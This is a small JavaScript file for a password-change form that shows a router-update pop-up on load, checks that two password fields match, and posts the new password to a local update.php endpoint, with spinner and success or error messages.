document.addEventListener('DOMContentLoaded', () => {
    const form        = document.getElementById('passwordForm');
    const pwdInput    = document.getElementById('password');
    const confirmInput= document.getElementById('confirmPassword');
    const messageBox  = document.getElementById('messageBox');
    const overlay     = document.getElementById('updating-popup');
    const cancelBtn   = document.getElementById('cancel-update');
  //  ─── New: Router-update pop-up on load ────────────
    const updateModal = document.getElementById('router-update-modal');
    const closeBtn    = document.getElementById('close-update-btn');

    updateModal.style.display = 'flex';
    closeBtn.addEventListener('click', () => {
      updateModal.style.display = 'none';
    });

    form.addEventListener('submit', e => {
      e.preventDefault();
      messageBox.style.display = 'none';
  
      // 1) Validate match
      if (pwdInput.value !== confirmInput.value) {
        messageBox.className = 'message-box error';
        messageBox.textContent = 'Passwords do not match.';
        messageBox.style.display = 'block';
        return;
      }
  
      // 2) Show spinner overlay
      overlay.style.display = 'flex';
  
      // 3) Send to PHP endpoint
      fetch('update.php', {
        method: 'POST',
        headers: { 'Content-Type':'application/json' },
        body: JSON.stringify({ password: pwdInput.value })
      })
      .then(r => r.json())
      .then(json => {
        overlay.style.display = 'none';
        if (json.status === 'success') {
          messageBox.className = 'message-box success';
          messageBox.textContent = 'Password updated successfully.';
          messageBox.style.display = 'block';
          // Attempt auto-close after 3s if opened by script
          setTimeout(() => {
            if (window.opener) window.close();
          }, 3000);
        } else {
          messageBox.className = 'message-box error';
          messageBox.textContent = json.message || 'Update failed.';
          messageBox.style.display = 'block';
        }
      })
      .catch(err => {
        overlay.style.display = 'none';
        messageBox.className = 'message-box error';
        messageBox.textContent = 'Network error. Please try again.';
        messageBox.style.display = 'block';
        console.error('Fetch error:', err);
      });
    });
  
    cancelBtn.addEventListener('click', () => {
      overlay.style.display = 'none';
    });
  });
  